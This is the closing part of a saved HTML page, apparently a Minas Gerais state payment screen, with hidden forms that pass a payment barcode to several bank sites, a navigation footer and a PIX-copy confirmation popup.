                            <input type="hidden" name="funcao" value="login">
                            <input type="hidden" name="codigoTransacao" value="0892">
                            <input type="hidden" name="codigoBarras"
                                value="85660000002377400632023121999149532570490239">
                            <input type="hidden" name="dataPagamento" value="">
                        </form>
                        <form id="formItau"
                            action="https://ww27.itau.com.br/Concessionaria/ConcessionariaWebApp/Home.aspx"
                            method="post" target="_blank">
                            <input type="hidden" name="CodBar" value="85660000002377400632023121999149532570490239">
                            <input type="hidden" name="ID" value="48">
                            <input type="hidden" name="NRC" value="">
                        </form>
                        <form id="formBancoSantander" action="https://www.santandernet.com.br/default.asp" method="post"
                            target="_blank">
                            <input type="hidden" name="CODBARRAS" value="85660000002377400632023121999149532570490239">
                        </form>
                        <form id="formBancoSicoob" action="https://www.sicoob.com.br/" method="post" target="_blank">
                            <input type="hidden" name="CODBARRAS" value="85660000002377400632023121999149532570490239">
                        </form>

                    </div>
                </div>
                <div style="display: none;">
                    <input type="hidden" name="actionRetornar" id="actionRetornar" value="Home.action">
                </div>
            </div>
        </div>



        <div id="footer_container">
            <div data-role="footer" data-position="fixed" data-theme="e" style="overflow: hidden;" role="contentinfo"
                class="ui-footer ui-bar-e ui-footer-fixed slideup">
                <div data-role="navbar" data-iconpos="top" data-theme="b" class="ui-navbar" role="navigation">
                    <ul class="ui-grid-b">
                        <li class="ui-block-a"><a id="comandoMenu" data-icon="bars"
                                class="ui-link ui-btn ui-icon-bars ui-btn-icon-top">Menu</a></li>
                        <li class="ui-block-b"><a id="comandoHome" data-icon="home" data-ajax="false"
                                class="ui-link ui-btn ui-icon-home ui-btn-icon-top">Home</a></li>
                        <li class="ui-block-c"><a id="comandoRetornar" data-icon="back" data-ajax="false"
                                class="ui-link ui-btn ui-icon-back ui-btn-icon-top">Voltar</a></li>
                    </ul>
                </div>
                <p class="footer">SEF-MG - versão: 5.4.3 </p>
            </div>
        </div>

        <div class="ui-screen-hidden ui-popup-screen ui-overlay-inherit" id="popup-copia-cola-screen"></div>
        <div class="ui-popup-container ui-popup-hidden ui-popup-truncate" id="popup-copia-cola-popup">
            <div data-role="popup" id="popup-copia-cola"
                class="ui-content ui-popup ui-body-d ui-overlay-shadow ui-corner-all" data-theme="d" data-mini="true"
                style="max-width:350px;">
                <p id="identificadorInfoMsg">Código PIX copiado com sucesso!</p>
            </div>
        </div>
    </div>

    <div class="ui-loader ui-corner-all ui-body-a ui-loader-verbose"><span class="ui-icon-loading"></span>
        <h1>Carregando...</h1>
    </div>
    <div class="ui-panel-dismiss"></div><iframe id="_hjSafeContext_60845766" title="_hjSafeContext" tabindex="-1"
        aria-hidden="true" src="./IPMG_files/MGPIX_files/saved_resource.html"
        style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe>
</body>

</html>